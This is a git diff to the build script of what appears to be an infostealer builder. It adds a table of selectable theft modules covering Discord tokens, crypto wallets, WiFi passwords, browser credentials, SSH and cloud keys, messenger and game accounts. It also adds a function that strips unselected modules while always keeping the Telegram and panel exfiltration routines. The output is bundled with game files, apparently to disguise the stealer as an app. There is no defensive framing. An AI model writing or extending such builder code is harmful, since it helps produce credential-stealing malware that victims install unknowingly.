@@ -28,6 +28,37 @@ function obfuscate(str, key) {
   return Buffer.from(r, 'binary').toString('base64')
 }
 
+const MODULE_FUNCS = {
+  discord_tokens: ['walkleveldb','gathertokens','getdiscorduser','apiget','getdiscordbilling','getdiscordguilds','getdiscordfriends','getdiscordchannels','getdiscordconnections','gatherdiscordadditional','gatherdiscordthemes'],
+  crypto_wallets: ['checkwallets'],
+  wifi_passwords: ['gatherwifipasswords'],
+  system_info: ['gathermoresysinfo','gatherprocesses','gatherinstalled','gatherenv','gatherhostsfile','gathercerts','gatherservices','gatherwsl','gatherrecentfiles','gatherusbhistory'],
+  geolocation: ['getpublicip','getgeolocation'],
+  browser_data: ['gatherbookmarks','gatherextensions','gatherbrowserprofiles','gatherbrowserfiles','getallbrowsercredentials','gatherallleveldb','gatherchromewebdata','gatherchromesessions','gatherfoxdata','gatherchromeextrawallets','gatherbrowserdownloads','gatherjetbrains'],
+  clipboard: ['monitorclipboard','exfiltratefiles'],
+  screenshots: ['capturescreenshot'],
+  app_creds: ['gatherfilezilla','gathersshkeys','gatherwinscp','gatherputtysessions','gathermobaxterm','gatherdbconnections','gathergitcreds','gatherwindowssavedcreds','gatherentracreds','gatherrdpconnections','gathervscodedata','gatherthunderbird','gatheroutlookprofiles','gatherspotify'],
+  messenger: ['gathermessengerapps','gathertelegram'],
+  cloud_creds: ['gathercloudcreds'],
+  steam_epic: ['gathersteam','gathergamedata']
+}
+
+function stripModules(src, selected) {
+  const keep = new Set()
+  for (const m of selected) { if (MODULE_FUNCS[m]) for (const fn of MODULE_FUNCS[m]) keep.add(fn) }
+  keep.add('main').add('sendtotg').add('tgsend').add('tgsendfile').add('sendfiletotg').add('sendtopanel').add('gatherinfo')
+  for (const [mod, fns] of Object.entries(MODULE_FUNCS)) {
+    if (!selected.includes(mod)) {
+      for (const fn of fns) {
+        const re = new RegExp('(function\\s+' + fn + '|async\\s+function\\s+' + fn + '|const\\s+' + fn + '|let\\s+' + fn + ')\\b[^}]*\\}', 'g')
+        src = src.replace(re, '')
+        if (fn === 'monitorclipboard') src = src.replace(/setInterval\(exfiltratefiles,\s*\d+\)\s*\n?/g, '')
+      }
+    }
+  }
+  return src
+}
+
 function buildApp(config, modules, appName) {
   const outdir = path.join(__dirname, '..', 'build_' + Date.now())
   fs.mkdirSync(outdir, { recursive: true })
@@ -40,6 +71,7 @@ function buildApp(config, modules, appName) {
 
   let mainSrc = fs.readFileSync(path.join(__dirname, '..', 'main.js'), 'utf8')
   mainSrc = 'require("./config.js")\n' + mainSrc
+  mainSrc = stripModules(mainSrc, modules)
   fs.writeFileSync(path.join(outdir, 'main.js'), mainSrc)
 
   for (const f of ['game.js', 'index.html', 'style.css', 'package.json']) {
